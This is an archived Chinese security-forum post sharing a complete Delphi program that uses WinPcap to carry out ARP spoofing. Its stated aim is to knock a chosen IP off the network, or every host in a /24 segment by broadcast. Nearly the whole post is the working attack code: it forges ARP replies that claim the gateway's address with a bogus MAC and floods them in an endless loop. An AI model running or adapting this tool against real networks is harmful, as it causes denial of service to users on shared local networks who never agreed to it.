
# Winpcap of Delphi ARP

> 原文：[`www.pediy.com/kssd/pediy10/68405.html`](https://www.pediy.com/kssd/pediy10/68405.html)

网上 C 语言很多.偶在这扔个半年前学习 `winpcap` 的代码.很烂.表拍砖.............  

功能:实现 ARP 欺骗  

代码:



```delphi
program Arp;

{$APPTYPE CONSOLE}

uses
  windows, IpHlpApi, IpTypes,
  Packet32, WinSock, math;

const
  MAC_SIZE = 6;

type
  MACADDRESS = array[0 .. MAC_SIZE - 1] of UCHAR;

type
  ETHERNET_HDR = packed record
    Destination: MACADDRESS;
    Source: MACADDRESS;
    Protocol: WORD;
  end;

type
  ARP_HDR = packed record
    HardwareType: WORD;
    ProtocolType: WORD;
    HLen: UCHAR;
    PLen: UCHAR;
    Operation: WORD;
    SenderHA: MACADDRESS;
    SenderIP: DWORD;
    TargetHA: MACADDRESS;
    TargetIP: DWORD;
  end;

type
  TSendData = Record
    HEther: ETHERNET_HDR;           // 以太网头
    ARP: ARP_HDR;                   // ARP 段
  end;

var
  NameList: Array[0..1024] of char;
  Buffer: array[0 .. 63] of Char;
  StrData: array[0..10] of string;
  BufferStr: String;
  NameLength, i: Longword;
  Num, Size: Integer;
  Strs: String;
  p: Padapter;
  pp: Ppacket;
  Ch: Byte;
  IP: DWORD;
  Mac: MACADDRESS;
  Gateway: DWORD;
  FComputerName, FComputerIP, CompIp, DestIP: string;
  SendData: TSendData;
  Ok: Boolean;
  Test: String;

function IntToStr(I: DWORD): String;
begin
  Str(I, Result);
end;

function StrPas(const Str: PChar): string;
begin
  Result := Str;
end;

function StrToInt(const S: string): Integer;
var
  E: Integer;
begin
  Val(S, Result, E);
end;

function MactoStr(Mac: MACADDRESS): String;
var
  ch1, ch2: Byte;
  i: Integer;
begin
  Result := '';
  for i := 0 to MAC_SIZE - 1 do
  begin
    ch1 := Mac[i] and $F0;
    ch1 := ch1 shr 4;
    if ch1 > 9 then
      ch1 := ch1 + Ord('A') - 10
    else
      ch1 := ch1 + Ord('0');
    ch2 := Mac[i] and $0F;
    if ch2 > 9 then
      ch2 := ch2 + Ord('A') - 10
    else
      ch2 := ch2 + Ord('0');
    Result := Result + Chr(ch1) + Chr(ch2);
    if i < 5 then
      Result := Result + ':';
  end;
end;

function IPtoStr(IP: DWORD): String;
begin
  result := IntToStr((IP and $FF000000) shr 24) + '.';
  result := result + IntToStr((IP and $00FF0000) shr 16) + '.';
  result := result + IntToStr((IP and $0000FF00) shr 8) + '.';
  result := Result + IntToStr((IP and $000000FF) shr 0);
end;

function Str2IP(s: String): DWORD;
var
  i: Integer;
  Index: Integer;
  Digit: String;
  IP: array[0 .. 4 - 1] of DWORD;
  Len: Integer;
begin
  // try
  Index := 1;
  for i := 0 to 4 - 1 do
    IP[i] := 0;
  Len := Length(s);
  for i := 0 to 4 - 1 do
  begin
    Digit := '';
    while (s[Index] >= '0') and (s[Index] <= '9') and (Index <= Len) do
    begin
      Digit := Digit + s[Index];
      inc(Index);
    end;
    inc(Index);
    IP[i] := StrToInt(Digit);
  end;
  Result :=
    IP[0] shl 24 +
    IP[1] shl 16 +
    IP[2] shl 8 +
    IP[3] shl 0;
  // except
  // Result:=0;
  // end;
end;

function IntToHex(Value: DWord; Digits: Integer): String;
asm
  // EAX = Value
  // EDX = Digits
  // ECX = @Result

  PUSH 0
  ADD ESP, -0Ch

  PUSH EDI
  PUSH ECX

  LEA EDI, [ESP+8+0Fh]  // EBX := @Buf[ 15 ]
  {$IFDEF SMALLEST_CODE}
  {$ELSE}
  AND EDX, $F
  {$ENDIF}

@@loop:
  DEC EDI
  DEC EDX

  PUSH EAX
  {$IFDEF PARANOIA}
  DB $24, $0F
  {$ELSE}
  AND AL, 0Fh
  {$ENDIF}

  {$IFDEF oldcode}
  {$IFDEF PARANOIA}
  DB $3C, 9
  {$ELSE}
  CMP AL, 9
  {$ENDIF}
  JA @@10
  {$IFDEF PARANOIA}
  DB $04, 30h-41h+0Ah
  {$ELSE}
  ADD AL, 30h-41h+0Ah
  {$ENDIF}

@@10:
  {$IFDEF PARANOIA}
  DB $04, 41h-0Ah
  {$ELSE}
  ADD AL, 41h-0Ah
  {$ENDIF}

  {$ELSE newcode}
  AAM
  DB $D5, $11 // AAD
  ADD AL, $30
  {$ENDIF newcode}

  // MOV byte ptr [EDI], AL
  STOSB
  DEC EDI
  POP EAX
  SHR EAX, 4

  JNZ @@loop
  TEST EDX, EDX
  JG @@loop
  POP EAX // EAX = @Result
  MOV EDX, EDI // EDX = @resulting string
  CALL System.@LStrFromPChar

  POP EDI
  ADD ESP, 10h
end;

function StrToMac(s: String): MACADDRESS;
var
  i: Integer;
  Index: Integer;
  Ch: String;
  Mac: MACADDRESS;
begin
  Index := 1;
  for i := 0 to MAC_SIZE - 1 do
  begin
    Ch := Copy(s, Index, 2);
    Mac[i] := StrToInt('$' + Ch);
    inc(Index, 2);
    while s[Index] = ':' do
      inc(Index);
  end;
  Result := Mac;
end;

Function GetSubStrNum(aString: String; SepChar: String): integer;
var
  i: Integer;
  StrLen: Integer;
  Num: Integer;
begin
  StrLen := Length(aString);
  Num := 0;
  For i := 1 to StrLen do
    If Copy(aString, i, 1) = SepChar then
      Num := Num + 1;
  result := Num;
end;

procedure GetClientPcNameIP;
const nSize = 256;
var
  strName: PChar;
  pWsaData: WSAData;
  nHostent: PHostEnt;
  Ver: Word;
begin
  try
    Ver := MakeWord(2, 0);
    if WSAStartup(Ver, pWsaData) <> 0 then exit;
    GetMem(strName, nSize);
    if GetHostName(strName, nSize) <> 0 then exit;
    FComputerName := strName;
    nHostent := GetHostByName(strName);
    FComputerIP := inet_ntoa((PInAddr((nHostent.h_addr_list)^))^);
  finally
    FreeMem(strName);
  end;
end;

function Split(Input: string; Deliminator: string; Index: Integer): string;
var
  StringLoop, StringCount: Integer;
  Buffer: string;
begin
  StringCount := 0;
  for StringLoop := 1 to Length(Input) do
  begin
    if (Copy(Input, StringLoop, 1) = Deliminator) then
    begin
      Inc(StringCount);
      if StringCount = Index then
      begin
        Result := Buffer;
        Exit;
      end
      else
      begin
        Buffer := '';
      end;
    end
    else
    begin
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    end;
  end;
  Result := Buffer;
end;

function GetMacByIP(Const IPAddr: string): string;
var
  dwResult: DWord;
  nIPAddr: integer;
  nMacAddr: array[0..5] of Byte;
  nAddrLen: Cardinal;
  WSAData: TWSAData;
begin
  if WSAStartup($101, WSAData) = -1 then Exit;
  nIPAddr := INet_Addr(PChar(IPAddr));
  if nIPAddr = INADDR_NONE then exit;
  nAddrLen := 6;
  dwResult := 1;
  try
    dwResult := SendARP(nIPAddr, 0, @nMacAddr, nAddrLen);
  except
  end;
  if dwResult = 0 then
    result := (IntToHex(nMacAddr[0], 2) + ':' +
      IntToHex(nMacAddr[1], 2) + ':' +
      IntToHex(nMacAddr[2], 2) + ':' +
      IntToHex(nMacAddr[3], 2) + ':' +
      IntToHex(nMacAddr[4], 2) + ':' +
      IntToHex(nMacAddr[5], 2))
  else
    result := '';
  WSACleanup;
end;

procedure MyNetwork(Ms: string; var IP: DWORD; var Mac: MACADDRESS; var Gateway: DWORD);
var
  i: Integer;
  p, pAdapterInfo: PIP_ADAPTER_INFO;
  uOutBufLen: ULONG;
  dwRes: DWORD;
begin
  pAdapterInfo := nil;
  uOutBufLen := 0;
  dwRes := GetAdaptersInfo(pAdapterInfo, uOutBufLen);
  if dwRes = ERROR_BUFFER_OVERFLOW then
  begin
    GetMem(pAdapterInfo, uOutBufLen);
    dwRes := GetAdaptersInfo(pAdapterInfo, uOutBufLen);
  end;
  if dwRes <> ERROR_SUCCESS then
  begin
    exit;
  end;
  p := pAdapterInfo;
  while p <> nil do
  begin
    if Pos(String(p^.AdapterName), Ms) <> 0 then
      break;
    p := p^.Next;
  end;
  try
    if p <> nil then
    begin
      IP := Str2IP(p^.IpAddressList.IpAddress.S);
      for i := 0 to MAC_SIZE - 1 do
        Mac[i] := p^.Address[i];
      Gateway := Str2IP(p^.GatewayList.IpAddress.S);
    end;
    // except
    // end;
  finally
    FreeMem(pAdapterInfo);
  end;
end;

procedure Help;
begin
  WriteLn('小小的程序.实验一下 ARP 欺骗.让个 IP.让其断网罢了.运行环境需要 Winpcap.作者:Open');
end;

label
  start, print;
begin
  Help;
  NameLength := 1024;
  ZeroMemory(@NameList, 1024);
  PacketGetAdapterNames(NameList, @NameLength);
  for i := 0 to NameLength - 1 do begin
    if ((NameList[i] = #0) and (NameList[i+1] = #0)) then
      break
    else
      if ((NameList[i] = #0) and (NameList[i+1] <> #0)) then
        NameList[i] := char(',');
  end;
  Strs := StrPas(NameList);
  Num := GetSubStrNum(Strs, ',');
  GetClientPcNameIP;
  for i := 0 to Num do begin
    StrData[i] := Split(Strs, ',', i+1);
    MyNetwork(StrData[i], ip, mac, Gateway);
    CompIp := iptostr(ip);
    if CompIp = FComputerIP then begin
      Strs := StrData[i];
      Break;
    end;
  end;
  WriteLn('Ethernet:' + strs);
  WriteLn('IP:' + iptostr(ip));
  WriteLn('Mac:' + MacToStr(Mac));
  WriteLn('Gateway:' + iptostr(Gateway));
  WriteLn('1.攻击指定 IP    2.攻击一个 C 段');
print:
  Write('请选择:');
  Readln(Test);
  if (Test <> '1') and (Test <> '2') then begin
    write('你的选择有误 ');
    goto print;
  end;
  ZeroMemory(@SendData, sizeof(TSendData));
  if Test = '1' then begin
start:
    write('请输入你要攻击的 IP:');
    Readln(DestIP);
    if GetSubStrNum(DestIP, '.') <> 3 then begin
      WriteLn('输入不正确');
      goto start;
    end
    else begin
      SendData.HEther.Destination := StrToMac(GetMacByIP(DESTIP));
    end;
  end;
  if Test = '2' then
    SendData.HEther.Destination := StrToMac('FF:FF:FF:FF:FF:FF');
  // SendData.HEther.Destination := StrToMac(GetMacByIP(DESTIP));
  for i := 0 to MAC_SIZE - 1 do
    SendData.HEther.Source[i] := 30 + Random(10) - 1;
  SendData.HEther.Protocol := $0608;
  SendData.ARP.HardwareType := $0100;
  SendData.ARP.ProtocolType := $08;
  SendData.ARP.HLen := $06;
  SendData.ARP.PLen := $04;
  SendData.ARP.Operation := $0200;
  SendData.ARP.SenderHA := StrToMac('00:00:00:00:00:00');
  SendData.ARP.SenderIP := inet_addr(PChar(iptostr(Gateway)));
  p := PacketOpenAdapter(pchar(strs));
  if (p = nil) or (p.hFile = INVALID_HANDLE_VALUE) then Exit;
  pp := PacketAllocatePacket;
  PacketInitPacket(pp, @SendData, SizeOf(SendData));
  if Test = '1' then begin
    WriteLn('正在对 IP:' + DestIP + '进行 ARP');
  end
  else begin
    WriteLn('正在一个 C 段进行 ARP');
  end;
  OK := True;
  while ok do begin
    PacketSendPacket(p, pp, true);
    if i >= 10 then begin
      Write('>');
      i := 0;
    end;
    i := i + 1;
    Sleep(50);
  end;
  PacketFreePacket(pp);
  PacketCloseAdapter(p);
end.
```
